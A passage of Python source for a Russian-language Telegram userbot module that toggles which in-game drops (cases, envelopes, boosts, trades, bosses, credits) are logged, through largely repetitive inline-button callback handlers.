                    await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Укажите переменные для типа строки 'кредиты'</b>")
                if "{nick}" in stri and "{cred}" in stri: 
                    self.set('creditss', stri)
                    await utils.answer(message, f"<emoji document_id=5332533929020761310>✅</emoji><b> Изменена строка 💳 <i>Кредиты</i> на</b>:\n{self.get('creditss')}")   
            
            else:
                await utils.answer(message, f"<emoji document_id=5240241223632954241>🚫</emoji><b> Ошибка | <code>{cmd}</code>\n<b>Введён некорретный тип строки</b>")

    @loader.command()
    async def sethelp(self, message: Message):
        '''Помощь для команды .setstr'''
        await utils.answer(message, "<u>Типы строк:</u>\n• <code>Кт</code> - <b>Сообщение при выпадении ✉️ Конверта</b>\n• <code>Ркт</code> - <b>Сообщение при выпадении 🧧 Редкого Конверта</b>\n• <code>К</code> - <b>Сообщение при выпадении 📦 Кейса</b>\n• <code>Рк</code> - <b>Сообщение при выпадении 🗳 Редкого Кейса</b>\n• <code>Миф</code> - <b>Сообщение при выпадении 🕋 Мифического Кейса</b>\n• <code>Кр</code> - <b>Сообщение при выпадении 💎 Кристального Кейса</b>\n• <code>Дк</code> - <b>Сообщение при выпадении 🎲 Дайс Кейса</b>\n• <code>Зв</code> - <b>Сообщение при выпадении 🌌 Звёздного Кейса</b>\n• <code>Бусты</code> - <b>⚡️ Сообщения при выпадении бустов<b>\n    - <code>бд15</code> - <b>Буст денег 1.5</b>\n    - <code>бр15</code> - <b>Буст руды 1.5</b>\n    - <code>бд2</code> - <b>Буст денег 2.0</b>\n    - <code>бр2</code> - <b>Буст руды 2.0</b>\n    - <code>бд25</code> - <b>Буст денег 2.5</b>\n    - <code>бр25</code> - <b>Буст руды 2.5</b>\n    - <code>бд3</code> - <b>Буст денег 3.0</b>\n    - <code>бр3</code> - <b>Буст руды 3.0</b>\n<i>Поддерживаемых перемен нету</i>\n\n• <code>Кредиты</code> - <b>Сообщение при перечислении тебе кредитов</b>\n    - <i>Поддерживаемые переменные:</i> <code>{nick}</code>, <code>{cred}</code>\n• <code>Обмен</code> - <b>Сообщение при переводе тебе кейсов</b>\n    - <i>Поддерживаемые переменные:</i> <code>{nick}</code>, <code>{cases}</code>\n\n<u>Переменные</u>:\n• <code>{nick}</code> - <b>Ник человека, который переводит тебе кейсы/кредиты</b>\n• <code>{cases}</code> - <b>Кейсы которые тебе переводят</b>\n• <code>{cred}</code> - <b>Количество кредитов которые тебе перечисляют</b>")
    @loader.command()
    async def mlogs(self, message):
        "Управление модулем"
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""

        if self.get('credits'):
            crd = ' ▫️<i> 💳 Кредиты</i>\n'
        else:
            crd = ''

        if self.get('boosters'):
            bosst = ' ▫️<i> ⚡️ Бусты </i>\n'
        else:
            bosst = ""

        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''

        if self.get('bosses'):
            bosss = ' ▫️<i> 🗡 Боссы </i>\n'
        else:
            bosss = ''
        await self.inline.form(
                text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}\n<b>Трейды:</b>\n{tradee}{tradeii}\n<b>Ресурсы:</b>\n{crd}{bosst}{bosss}",
                message=message,
                reply_markup=[
                    [
                            {
                                "text": "📦 Кейсы",
                                "callback": self.icases,
                            },
                            {
                                "text" : "⚡️ Бусты",
                                "callback" : self.iboost,
                            },
                            {
                                "text" : "♻️ Трейды",
                                "callback" : self.itrade,
                            },
                    ],
                    [
                            {
                                "text": "🗡 Боссы",
                                "callback": self.iboss,
                            },
                            {
                                'text' : "💳 Кредиты",
                                'callback' : self.icrd,
                            },
                    ],
                    [
                            {
                                "text": "🔻 Закрыть",
                                "action" : "close",
                            }
                    ],
                ],
          )  


    async def icrd(self,call:InlineCall):
        self.set('credits', not self.get('credits'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""

        if self.get('credits'):
            crd = ' ▫️<i> 💳 Кредиты</i>\n'
        else:
            crd = ''

        if self.get('boosters'):
            bosst = ' ▫️<i> ⚡️ Бусты </i>\n'
        else:
            bosst = ""

        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''

        if self.get('bosses'):
            bosss = ' ▫️<i> 🗡 Боссы </i>\n'
        else:
            bosss = ''
        await call.edit(
                text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}\n<b>Трейды:</b>\n{tradee}{tradeii}\n<b>Ресурсы:</b>\n{crd}{bosst}{bosss}",
                reply_markup=[
                    [
                            {
                                "text": "📦 Кейсы",
                                "callback": self.icases,
                            },
                            {
                                "text" : "⚡️ Бусты",
                                "callback" : self.iboost,
                            },
                            {
                                "text" : "♻️ Трейды",
                                "callback" : self.itrade,
                            },
                    ],
                    [
                            {
                                "text": "🗡 Боссы",
                                "callback": self.iboss,
                            },
                            {
                                'text' : "💳 Кредиты",
                                'callback' : self.icrd,
                            },
                    ],
                    [
                            {
                                "text": "🔻 Закрыть",
                                "action" : "close",
                            }
                    ],
                ],
          )  
    async def icases(self, call: InlineCall):
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""

        if self.get('credits'):
            crd = ' ▫️<i> 💳 Кредиты</i>\n'
        else:
            crd = ''

        if self.get('boosters'):
            bosst = ' ▫️<i> ⚡️ Бусты </i>\n'
        else:
            bosst = ""

        if self.get('tradec'):
            tradee = ' ▫️<i> 📦 Передача кейсов</i>\n'
        else:
            tradee = ''

        if self.get('tradei'):
            tradeii = ' ▫️<i> 🪄 Передача предметов</i>\n'
        else:
            tradeii = ''

        if self.get('bosses'):
            bosss = ' ▫️<i> 🗡 Боссы </i>\n'
        else:
            bosss = ''
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )
    async def ikt(self, call: InlineCall):
        self.set('kt', not self.get('kt'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )

    
    async def ips(self, call: InlineCall):
        self.set('ps', not self.get('ps'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )
        
    async def iss(self, call: InlineCall):
        self.set('ss', not self.get('ss'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )
        
    async def irkt(self, call: InlineCall):
        self.set('rkt', not self.get('rkt'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )


    async def ik(self, call: InlineCall):
        self.set('k', not self.get('k'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )


    async def irk(self, call: InlineCall):
        self.set('rk', not self.get('rk'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )


    async def imif(self, call: InlineCall):
        self.set('mif', not self.get('mif'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )


    async def ikr(self, call: InlineCall):
        self.set('kr', not self.get('kr'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
                    "text": "🗳 Редкий Кейс",
                    "callback": self.irk,
                },
            ],
            [
                {
                    "text": "🕋 Мифический",
                    "callback": self.imif,
                },
                {
                    "text": "💎 Кристальный",
                    "callback": self.ikr,
                },
            ],
            [
                {
                    "text": "💼 Портфель",
                    "callback": self.ips, 
                },
                {
                    "text": "👜 Сумка",
                    "callback": self.iss
                }
            ],
            [
                {
                    "text" : "🎲 Дайс",
                    'callback' : self.idk,
                },
                {
                    "text": "🌌 Звёздный Кейс",
                    "callback": self.izv,
                },
            ],
            [
                {
                    "text": "🔙 Назад",
                    "callback": self.iback,
                }
            ],
        ]           
    )


    async def izv(self, call: InlineCall):
        self.set('zv', not self.get('zv'))
        if self.get('kt'):
            ktt = ' ▫️<i> ✉️ Конверты</i>\n'
        else:
            ktt = ''

        if self.get('rkt'):
            rktt = ' ▫️<i> 🧧 Редкие конверты</i>\n'
        else: 
            rktt = ''

        if self.get('k'):
            kk = ' ▫️<i> 📦 Кейсы</i>\n'
        else:
            kk = ''

        if self.get('rk'):
            rkk = ' ▫️<i> 🗳 Редкие Кейсы</i>\n'
        else:
            rkk = ''

        if self.get('mif'):
            miff = ' ▫️<i> 🕋 Мифические Кейсы</i>\n'
        else:
            miff = ''

        if self.get('ps'):
            psss = ' ▫️<i> 💼 Портфель с Эскизами</i>\n'
        else:
            psss = ''

        if self.get('ss'):
            ssss = ' ▫️<i> 👜 Сумка с Предметами</i>\n'
        else:
            ssss = ''

        if self.get('kr'):
            krr = ' ▫️<i> 💎 Кристальные Кейсы</i>\n'
        else:
            krr = ""

        if self.get('dk'):
            dkk = " ▫️<i> 🎲 Дайс Кейс</i>\n"
        else:
            dkk = ''
        
        if self.get('zv'):
            zvv = ' ▫️<i> 🌌 Звёздные Кейсы</i>\n'
        else:
            zvv = ""
        await call.edit(
            text=f"<b>Логгируемые кейсы:</b>\n{ktt}{rktt}{kk}{rkk}{miff}{psss}{ssss}{krr}{dkk}{zvv}",
            reply_markup=[
            [
                {
                    "text": "✉️ Конверт",
                    "callback": self.ikt,
                },
                {
                    "text": "🧧 Редкий Конверт",
                    "callback": self.irkt,
                },
            ],
            [
                {
                    "text": "📦 Кейс",
                    "callback": self.ik,
                },
                {
